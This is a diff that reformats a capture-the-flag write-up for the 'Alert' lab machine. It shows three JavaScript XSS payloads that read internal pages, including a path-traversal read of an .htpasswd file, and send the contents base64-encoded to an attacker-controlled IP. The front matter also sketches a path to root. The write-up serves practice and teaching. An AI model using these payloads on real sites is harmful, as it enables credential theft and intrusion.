@@ -1,4 +1,5 @@
 ---
+
 title: Alert
 published: 2026-10-13
 description: Alert is an easy-difficulty Linux machine with a website to upload, view, and share markdown files. The site is vulnerable to cross-site scripting (XSS), which is exploited to access an internal page vulnerable to Arbitrary File Read and leveraged to gain access to a password hash. The hash is then cracked to reveal the credentials leveraged to gain SSH access to the target. Enumeration of processes running on the system shows a PHP file that is being executed regularly, which has excessive privileges for the management group our user is a member of and allows us to overwrite the file for code execution as root.
@@ -150,11 +151,11 @@ And this is the script
 
 ```js
 var req = new XMLHttpRequest();
-req.open('GET', 'http://alert.htb/index.php?page=messages', false);
+req.open("GET", "http://alert.htb/index.php?page=messages", false);
 req.send();
 
 var info = new XMLHttpRequest();
-info.open('GET', 'http://10.10.15.41/?infoinB64=' + btoa(req.responseText));
+info.open("GET", "http://10.10.15.41/?infoinB64=" + btoa(req.responseText));
 info.send();
 ```
 
@@ -240,11 +241,15 @@ Let's modify our script but now pointing to this .txt file
 
 ```js
 var req = new XMLHttpRequest();
-req.open('GET', 'http://alert.htb/messages.php?file=2024-03-10_15-48-34.txt', false);
+req.open(
+	"GET",
+	"http://alert.htb/messages.php?file=2024-03-10_15-48-34.txt",
+	false,
+);
 req.send();
 
 var info = new XMLHttpRequest();
-info.open('GET', 'http://10.10.15.41/?infoinB64=' + btoa(req.responseText));
+info.open("GET", "http://10.10.15.41/?infoinB64=" + btoa(req.responseText));
 info.send();
 ```
 
@@ -408,11 +413,15 @@ This is the script now
 
 ```js
 var req = new XMLHttpRequest();
-req.open('GET', 'http://alert.htb/messages.php?file=../../../../../../../../var/www/statistics.alert.htb/.htpasswd', false);
+req.open(
+	"GET",
+	"http://alert.htb/messages.php?file=../../../../../../../../var/www/statistics.alert.htb/.htpasswd",
+	false,
+);
 req.send();
 
 var info = new XMLHttpRequest();
-info.open('GET', 'http://10.10.15.41/?infoinB64=' + btoa(req.responseText));
+info.open("GET", "http://10.10.15.41/?infoinB64=" + btoa(req.responseText));
 info.send();
 ```
 
